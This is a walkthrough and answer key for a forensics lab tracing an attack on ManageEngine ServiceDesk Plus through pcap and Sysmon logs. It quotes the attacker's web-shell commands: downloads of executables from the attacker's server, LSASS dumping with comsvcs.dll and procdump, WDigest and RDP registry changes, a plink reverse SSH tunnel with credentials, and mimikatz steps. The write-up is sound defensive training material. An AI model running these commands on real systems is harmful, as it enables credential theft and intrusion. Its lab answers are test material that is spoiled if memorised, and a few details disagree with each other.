# Still Unpatched?
#### Category:
`Endpoint Forensics` `Network Forensics`

# Difficulty:
`Easy`

#### Tags:
`sysmon` `wireshark` `cyberchef` `mimikatz` `T1003` `T1012` `T1572 ` `T1505.003` `T1021.001` `T1112`


#### Instructions:
- Uncompress the lab (pass: cyberdefenders.org)


#### Scenario:
The HR manager, faced a critical security breach when his laptop became the entry point for a cyberattack due to unpatched software. The attack is done by exploiting a vulnerability in one of his software, allowing the attacker to drop malicious files and gain access to the system.

#### Tools
- Wireshark
- Event Viewer or LogViewPlus
- CyberChef
- mimikatz

<hr>

# Questions:

#### Q1: The attacker started the attack by sending a modified http request. What was the target URL used to apply the exploit?
```
/*******/*****************?****=*
```

#### Q2: What Programming Language was the Exploit written in and the library used and it's version?
```
******-********/*.**.*
```

#### Q3: To exploit the vulnerability the attacker Uploaded a Malicious File. What is the name of that file?
```
*******.***
```

#### Q4: What is the name of the Vulnerable Software that have been Exploited?
```
************ *********** ****
```

#### Q5: The Exploit consists of 2 stages, in the first stage the attacker uploads the malicious file, and in the second stage it involved initiating instalation of Site24x7 and the installation is done by executing the malicious file that have been uploaded by the attacker. What Command Used in the installation?
```
*******.*** /* ********************.*** ******=**** /**
```
> [!TIP]
> evtx time?

#### Q6: When the malicious file is executed another file is written can you tell where it is located? (Absolute Path including the filename) 
```
*:\******* ***** (***)\************\***********\******\*****\****.***
```
> [!TIP]
> 1. evtx + pcap...
> 2. maybe http?

#### Q7: What is the type of the attack that can happen using this file?
```
*** *****
```

#### Q8: Now the attacker reached to the initial access, can you tell what privilege does he has? (What User?)
```
** *********\******
```

#### Q9: What is the Authentication Method/Protocol did the Threat Actor check for?
```
*******
```

#### Q10: The Attacker Modified a registery value write the full registiry path including this value
```
****\******\*****************\*******\*****************\*******\******************
```

#### Q11: When this method is enabled. In what format are passwords stored in memory?
```
*********
```

#### Q12: What is the proccess that the attacker tried to dump?
```
*****
```

#### Q13: What dll file did the attacker use to apply the dump?
```
*******.***
```

#### Q14: The attacker dumped the process and wrote the dumo to a certain file, and then he downloaded it. can you tell the size of that file? (in bytes)
```
*****
```

#### Q15: Did it Work? (yay, nay)
```
***
```
> [!TIP]
> Based on the Size

#### Q16: The Attacker downloaded a file to the Victim's Machine can you tell from where did he download it? (<IP>:<PORT>)
```
***.***.*.*:****
```

#### Q17: This file seems to be a calculator!!. hmm...? I think it's not a calculator. what is it? 
```
********.***
```
> [!TIP]
> Invistigate the real filename

#### Q18: Another file has been downloaded from the Victim to the attacker. What Was its Size? (in bytes)
```
********
```
#### Q19: What command did the cover his tracks?
```
******-**** -**** "*:\*******\****\******.***", "*:\*******\****\******.***"
```

#### Q20: In the lab files you will see a bin file which has the OS Credintials and also a password of ZIP file (the second part of the lab). What is USERNAME:PASSWORD? (DON'T CHEAT)
```
******:*********
```

#### Q21: After a while the attacker started to search for a confidential data. can you tell what was the first directory he looked at?
```
*:\*****\******\********

```

#### Q22: What Did he try to steal? (filename)
```
*********.***
```

#### Q23: The fun is not over yet. he decided to download another file to the victim machine. what is the name of that file at the server?
```
****.***
```
#### Q24: Then he checked for a service status. What was it?
```
***********
```

#### Q25: After That he was hungry for more evil. He needed to ensure that they can remotely access the system. How can he access the system Remotely, what protocol does he need?
```
***
```

#### Q26: What Registery Value Did he change to allow RDP? (path included)
```
****\******\*****************\*******\******** ******\******************
```

#### Q27: There is a .bat file was created. Where is it? (Absolute Path including the filename)
```
*:\*****\******\*********\***.***
```

#### Q28: As we noticed this hacker is smart. he never use the real filename. What is the real filename of the file he downloaded combined with its MD5 hash? <FILENAME.EXE>:MD5
```
*****.***:********************************
```

#### Q29: Like you did notice this batch will be used in Establishing SSH Connection. What is the IP address of SSH Server and its Port? (<ip_addr>:<port>)
```
***.***.*.*:***
```

#### Q30: The actor used the technique of port forwarding to listen on the remote port: `ANS1`, and forward the requests to `ANS2`. ANS* = <ip_addr>:<port>
```
ASN1, ANS2
```

#### Q31: What is the type of SSH Server that the attacker uses? (Software Name)
```
SSH-*.*-*.** *******:******** *** ****** (*******) *.**
```
> [!TIP]
> How many handshakes?
> Push Harder

#### Q32: Over this SSH Connection the Attacker was able to RDP. Can you identify the timestamp of the first time ? (Y-M-D 24:00)

```
****-**-** **:**
```
> [!TIP]
> RDP Clipboard Monitor

<hr>
<br>

# Still Unpatched? Walkthrough

#### We are given a ZIP File with password "cyberdefenders.org"

![image](https://github.com/user-attachments/assets/bdd7e906-7f82-49f6-a7fd-df0870c169cd)


- We Got 4 files [1.pcap, sysmon_log.evtx, logctl.bin, 2.zip]

- After Reading the Tags and The Scenario we can understand that there is a Software that have a vulnerability and this vulnerability have been exploited. Then the attacker gained dumped some credentials `T1003` also there is a webshell  `T1505.003` and RDP `T1021.001`.

### OK, Let's See What We Got Here...
<br>

#### Q1: The attacker started the attack by sending a modified http request. What was the target URL used to apply the exploit?
```
/*******/*****************?****=*
```

- Open `1.pcap` on wireshark
- filter `http`
- Looks we got a POST request from ip `192.168.20.134` which he will probably be the attacker in this lab.
![image](https://github.com/user-attachments/assets/265a38f4-c5be-46ea-8489-87298fa78f81)
- He sent this request to `192.168.20.147` on port `8080` to /RestAPI/ImportTechnicians?step=1
##### - Answer: ```/RestAPI/ImportTechnicians?step=1```

<br>

#### Q2: What Programming Language was the Exploit written in and the library used and it's version?
```
******-********/*.**.*
```
- We can easily look at the User-Agent of the Request and Find our Answer.
![image](https://github.com/user-attachments/assets/011a6a6b-66a6-49a3-9931-ca1477e3132b)

##### - Answer: ```python-requests/2.28.1```

<br>

#### Q3: To exploit the vulnerability the attacker Uploaded a Malicious File. What is the name of that file?
```
*******.***
```
- Untill now the answer still can be found in the same packet
![image](https://github.com/user-attachments/assets/b1d7b46a-3bdd-4431-990b-52e300d5ec8c)


##### - Answer: `msiexec.exe`

<br>

#### Q4: What is the name of the Vulnerable Software that have been Exploited?
```
************ *********** ****
```
- We can look at the evtx file and find the answer or invistigate some packets.
- if looked at the response of `GET /favicon.ico` we can easily find the Answer in the HTML <title> tag. 

![image](https://github.com/user-attachments/assets/13525953-254f-421d-93bd-c3b61fa597c7)

![image](https://github.com/user-attachments/assets/ef068a20-e2ea-4e0e-a60a-dd7e6e9ffd93)


##### - Answer:  `ManageEngine ServiceDesk Plus`

<br>

#### Q5: The Exploit consists of 2 stages, in the first stage the attacker uploads the malicious file, and in the second stage it involved initiating instalation of Site24x7 and the installation is done by executing the malicious file that have been uploaded by the attacker. What Command Used in the installation?
```
*******.*** /* ********************.*** ******=**** /**
```
> [!TIP]
> evtx time?

- we can search for the `msiexec.exe` in the evtx using Event Viewer

![image](https://github.com/user-attachments/assets/42638997-3d5b-4e1d-9c54-c2d543e35b88)

- Looks like there is `C:\Program Files (x86)\ManageEngine\ServiceDesk\bin\msiexec.exe` file created by `C:\Program Files (x86)\ManageEngine\ServiceDesk\jre\bin\java.exe` 
- Keep Digging for a Command where the `msiexec.exe` file have been used.
- In the Event After the previous one, you will find `CommandLine: msiexec.exe /i Site24x7WindowsAgent.msi EDITA1=null /qn `, which initiate the installation of Zoho’s Site24x7 performance monitoring tool.
- 
##### - Answer: `msiexec.exe /i Site24x7WindowsAgent.msi EDITA1=null /qn`

<br>

#### Q6: When the malicious file is executed another file is written can you tell where it is located? (Absolute Path including the filename) 
```
*:\******* ***** (***)\************\***********\******\*****\****.***
```
> [!TIP]
> 1. evtx + pcap...
> 2. maybe http?

- We got two hints, we already know the path of the ManageEngine ServiceDesk `C:\Program Files (x86)\ManageEngine\ServiceDesk\`.
- Let's take a look at the pcap file. `http` filter still on.
- If follower the HTTP Requests we will find a `GET /custom/login/wbsh.jsp`. so add this to the full path we have and we got our answer. filter: `http and ip.addr==192.168.20.134`

![image](https://github.com/user-attachments/assets/299fdd15-6c6d-4b08-b052-72d894382fa9)

![image](https://github.com/user-attachments/assets/f02fe877-a222-4588-a488-0ea7a524c4cf)

##### - Answer: `C:\Program Files (x86)\ManageEngine\ServiceDesk\custom\login\wbsh.jsp`

<br>

#### Q7: What is the type of the attack that can happen using this file?
```
*** *****
```
- JSP files are used for creating dynamic web content. They embed Java code within HTML to generate dynamic content on the server before sending it to the client's browser.
- We Can abuse JSP files to reach a `Web Shell`. [MORE FUN](https://www.microsoft.com/en-us/security/blog/2021/02/11/web-shell-attacks-continue-to-rise/)

##### - Answer: `Web Shell`

<br>

#### Q8: Now the attacker reached to the initial access, can you tell what privilege does he has? (What User?)
```
** *********\******
```
- Now we know that the attacker got a Web Shell, So he will probably do some enumurations.
![Enum](https://github.com/user-attachments/assets/cab66110-798c-4f84-83b8-0d504850d3c8)
- `whoami`, `ipconfig /all`, `systeminfo`, `arp -a`, `tasklist`
- We can answer the question by looking at the response to GET custom/login/wbsh.jsp?cmd=whoami&action=exec

![image](https://github.com/user-attachments/assets/d4434a28-0a97-47e7-85ba-860b70e2f69f)

##### - Answer: `NT AUTHORITY\SYSTEM`

<br>

#### Q9: What is the Authentication Method/Protocol did the Threat Actor check for?
```
*******
```
- You can find a reg query command.

![image](https://github.com/user-attachments/assets/8444ba74-c662-4d28-ad28-6f18b2570c9d)

![image](https://github.com/user-attachments/assets/f86e36ea-d17f-4663-9351-10a970cc1b37)

- `reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential` Checks the registry to see if the `WDigest` authentication setting is configured to use UseLogonCredential.

##### - Answer: `WDigest`

<br>

#### Q10: The Attacker Modified a registery value write the full registiry path including this value
```
****\******\*****************\*******\*****************\*******\******************
```
- Almost 99% of attacker's attemps is captured in the 1.pcap file
![image](https://github.com/user-attachments/assets/aa6f4ed9-3431-4d6f-ad76-aa3d308accc6)

- `Set-ItemProperty -Force -Path  'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name  'UseLogonCredential' -Value '1'` so basicallay he enabled the UserLogonCredential in WDigest now we got a Plaintext passwords in memory for the WDigest authentication protocol.
- We Can also use sysmon evtx Evemt ID 13 

![image](https://github.com/user-attachments/assets/743cdc82-6e70-44f9-be03-7bee98be0e44)


##### - Answer:  `HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential`

<br>

#### Q11: When this method is enabled. In what format are passwords stored in memory?
```
*********
```

##### Answer: `plaintext`

<br>

#### Q12: What is the proccess that the attacker tried to dump?
```
*****
```
- Keep Digging with the HTTP Request and The Commands
- you will see `C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump, 652 C:\Windows\Temp\logctl.zip full`
- the attacker is trying to dumo a process with PID of `652`
- We All know that WDigest Enabled = LSASS Dump
- But Let's Walk with this, Remember the `tasklist` command in the enumuration?

![image](https://github.com/user-attachments/assets/055571f7-0af7-4458-ae1f-411d3b802f1f)

##### - Answer: `LSASS`

<br>

#### Q13: What dll file did the attacker use to apply the dump?
```
*******.***
```
- `C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump, 652 C:\Windows\Temp\logctl.zip full`
- there should be `logctl.zip` file written now to `C:\Windows\Temp\logctl.zip`

##### - Answer: comsvcs.dll

<br>

#### Q14: The attacker dumped the process and wrote the dumo to a certain file, and then he downloaded it. can you tell the size of that file? (in bytes)
```
*****
```
- The Attacker now downloaded this file using this request `GET /custom/login/wbsh.jsp?file=C:\Windows\Temp\logctl.zip&action=download`

![image](https://github.com/user-attachments/assets/4551e387-329a-43c7-9ba6-8aec6aabeab5)

- now a file transfer should occur right? let's look at the response
- Response:- Content-Length: 0, which means the file is empty and equal to 0 bytes.
![image](https://github.com/user-attachments/assets/e97ebd43-0e23-42a0-9610-47a061d12871)

##### - Answer: `00000`

<br>

#### Q15: Did it Work? (yay, nay)
```
***
```
> [!TIP]
> Based on the Size
- Empty File == No Dump == nay

##### - Answer: `nay`

<br>

#### Q16: The Attacker downloaded a file to the Victim's Machine can you tell from where did he download it? (<IP>:<PORT>)
```
***.***.*.*:****
```
- Packet no.6584 `(New-Object System.Net.WebClient).DownloadFile('http://192.168.1.2:9000/file2.exe', 'C:\windows\temp\calc.exe')` 

#### - Answer: `192.168.1.2:9000`

<br>

#### Q17: This file seems to be a calculator!!. hmm...? I think it's not a calculator. what is it? 
```
********.***
```
> [!TIP]
> Invistigate the real filename
- There is Two Ways to Answer this question. i will use a the first way in this question, and there is a similar one coming soon.
- fiter: `http and (ip.addr==192.168.20.134 or ip.addr==192.168.1.2)`
- Extract the File from the pcap to calc.exe
![image](https://github.com/user-attachments/assets/b52b35c9-f05d-4ea0-b5e5-52233afe107a)

- Media Type -> Right Click -> Export Packet Bytes -> calc.exe -> save
![image](https://github.com/user-attachments/assets/9ae68542-123a-4c36-8552-7fc9846c35f2)

![image](https://github.com/user-attachments/assets/96486c64-0981-4afb-a17f-c901ce98d01e)

- See File Details -> Original Filename

![image](https://github.com/user-attachments/assets/b81b7416-a0a1-4fdc-ad5d-c4e468a70e3e)

##### - Answer: `procdump.exe`

<br>

#### Q18: Another file has been downloaded from the Victim to the attacker. What Was its Size? (in bytes)
```
********
```
- The Attacker Has dumped LSASS Proccess using `procdump.exe` using this command `C:\windows\temp\calc.exe -accepteula -ma 652 C:\Windows\Temp\logct2.dmp`
- Now, He is going to download `C:\Windows\Temp\logct2.dmp`

![Download Procdump](https://github.com/user-attachments/assets/647e2156-eb86-414c-a8dd-f2b2eaa7172f)

![222](https://github.com/user-attachments/assets/6ea297c3-5cd9-4d8b-baa6-35d83ed76b24)


##### - Answer: `54998530`

<br>

#### Q19: What command did the cover his tracks?
```
******-**** -**** "*:\*******\****\******.***", "*:\*******\****\******.***"
```

![image](https://github.com/user-attachments/assets/84950e71-8e33-4858-a12f-c30d644a7380)

> I'm Using CyberChef for URL Decoding

##### - Answer: `Remove-Item -Path "C:\Windows\Temp\logct2.dmp", "C:\Windows\Temp\logctl.zip"`

<br>

#### Q20: In the lab files you will see a logctl.bin file which has the OS Credintials and also a password of ZIP file (the second part of the lab). What is USERNAME:PASSWORD? (DON'T CHEAT)
```
******:*********
```
- We Need to use [Mimikatz](https://github.com/ParrotSec/mimikatz) to get the Credentials

![image](https://github.com/user-attachments/assets/d713d5b5-296f-43ea-821a-2e9bd0bf5cdf)

- open it, then `# sekurlsa::minidump logctl.bin` -> `sekurlsa::logonpasswords`

![victim123](https://github.com/user-attachments/assets/cd7ae08d-8dbf-49d2-bf6d-b0ece30987cd)

##### - Answer: `Victim:victim123`

<br>

#### Q21: After a while the attacker started to search for a confidential data. can you tell what was the first directory he looked at?
```
*:\*****\******\********
```
- Open `2.pcap` file now
- filter: `http and ip.addr ==192.168.20.134`
![image](https://github.com/user-attachments/assets/8f49ab54-9736-4867-b46d-eb9d56ec127c)



#### - Answer: - `C:\Users\Victim\Pictures`

#### Q22: What Did he try to steal? (filename)
```
*********.****
```
- What Did he Download?
![image](https://github.com/user-attachments/assets/4779af86-0cbd-4b6d-b4ae-895c83ca3a12)
- It failed because of an error in filename he wrote in the download feild `dir C:\Users\Victim\Desktop\Employees.xlsx`

##### - Answer: `Employees.xlsx`

<br>

#### Q23: The fun is not over yet. he decided to download another file to the victim machine. what is the name of that file at the server?
```
****.***
```
- `GET /custom/login/wbsh.jsp?cmd=(New-Object System.Net.WebClient).DownloadFile('http://192.168.1.2:9000/file.exe', 'C:\windows\temp\ekern.exe')&action=exec HTTP/1.1 `
- Downloaded `file.exe` and wrote it to `C:\windows\temp\ekern.exe`
![image](https://github.com/user-attachments/assets/8a8eb7b7-fbea-4a00-bb9d-99e878e8ff41)

##### - Answer: `file.exe`

<br>

#### Q24: Then he checked for a service status. What was it?
```
***********
```
- `GET /custom/login/wbsh.jsp?cmd=Get-Service -Name TermService&action=exec HTTP/1.1`

##### - Answer: `TermService` 

<br>

#### Q25: After That he was hungry for more evil. He needed to ensure that they can remotely access the system. How can he access the system Remotely, what protocol does he need?
```
***
```
##### - Answer: `RDP`

<br>


#### Q26: What Registery Value Did he change to allow RDP? (path included)
```
****\******\*****************\*******\******** ******\******************
```

- There is an base64 encoded command let's decode it

![image](https://github.com/user-attachments/assets/8800d647-cd2a-4879-954f-144f2ce0c3be)

![image](https://github.com/user-attachments/assets/879ed362-315b-461e-aec6-49bb4033dbe9)

- Looks Like the Attacker is Enabling RDP for enabling remote access.
  
##### - Answer: `HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\fDenyTSConnections`

<br>

#### Q27: There is a .bat file was created. Where is it? (Absolute Path including the filename)
```
*:\*****\******\*********\***.***
```
- From evtx

![batt](https://github.com/user-attachments/assets/e4b06d9f-98f3-498b-acc6-bfe4de6b5494)

- From pcap: the attacker used base64 again to write the file.

![image](https://github.com/user-attachments/assets/e8bf9fb3-421c-404e-ba61-86a9dbc59971)

![image](https://github.com/user-attachments/assets/b85a76ac-4342-49a2-9a68-64a87b05a7c7)

```
$batchContent = 'echo y|C:\Windows\Temp\ekern.exe -ssh -P 443 -l v1ctim -pw C@nt_D3f3nd -R 127.0.0.1:49800:192.168.20.147:3389 192.168.1.2'
$batchFilePath = 'C:\Users\Victim\Documents\FXS.bat'
Set-Content -Path $batchFilePath -Value $batchContent
```

##### - Answer: `C:\Users\Victim\Documents\FXS.bat`

<br>

#### Q28: As we noticed this hacker is smart. he never use the real filename. What is the real filename of the file he downloaded combined with its MD5 hash? <FILENAME.EXE>:MD5
```
*****.***:********************************
```
- Search for `ekern.exe` in event viewer and we got our answer, the real filename is Plink and md5=CC62BA67C1200202D1DA784EA0313408

![image](https://github.com/user-attachments/assets/bea969e9-598d-4f96-8e00-e4cf53bd1894)


##### - Answer: `plink.exe:CC62BA67C1200202D1DA784EA0313408`

<br>

#### Q29: Like you did notice this batch will be used in Establishing SSH Connection. What is the IP address of SSH Server and its Port? (<ip_addr>:<port>)
```
***.***.*.*:***
```
- FXS.bat content:
```
echo y|C:\Windows\Temp\ekern.exe -ssh -P 443 -l v1ctim -pw C@nt_D3f3nd -R 127.0.0.1:49800:192.168.20.147:3389 192.168.1.2'
```
- Server IP = 192.168.1.2 , Port = 443 
##### - Answer :  `192.168.1.2:443`

<br>

#### Q30: The actor used the technique of port forwarding to listen on the remote port: `ANS1`, and forward the requests to `ANS2`. ANS* = <ip_addr>:<port>
```
ASN1, ANS2
```
- `127.0.0.1:49800 ` is the local machine (server) where the reverse tunnel listens for incoming connections.
- `192.168.20.145:3389` to which the reverse tunnel forwards the incoming connections. This is used to forward RDP requests.

##### - Answer: `127.0.0.1:49800, 192.168.20.145:3389`

<br>

#### Q32: What is the type of SSH Server that the attacker uses? (Software Name)
```
SSH-*.*-*.** *******:******** *** ****** (*******) *.**
```
> [!TIP]
> How many handshakes?
> Push Harder
- Let's Get Back to Pcap
- Filter: `ip.addr==192.168.1.2 and  tcp.port eq 443`
- Let's Follow the TCP threeway handshake
- Now Find PSH Flags and we got our answer
![image](https://github.com/user-attachments/assets/6ce73cee-ab06-49b5-9759-4e48becf6d52)

##### - Answer: `SSH-2.0-9.38 FlowSsh: Bitvise SSH Server (WinSSHD) 9.38`

<br>

#### Q33: Over this SSH Connection the Attacker was able to RDP. Can you identify the timestamp of the first time ? (Y-M-D 24:00)

```
****-**-** **:**
```
> [!TIP]
> RDP Clipboard Monitor
- In the 2.evtx file search for the first `rdpclip.exe`
- Which is responsible for managing the shared clipboard between the local computer and the remote desktop.
- Executing it means there is an establishment of an RDP connection.
![rdp](https://github.com/user-attachments/assets/542a68d8-109d-4a3c-81c4-7a77925c67cc)
-

##### - Answer: `2024-07-20 14:02`

> This was my first lab ever, and I hope you liked it. Thank you <3

<br>
<hr>
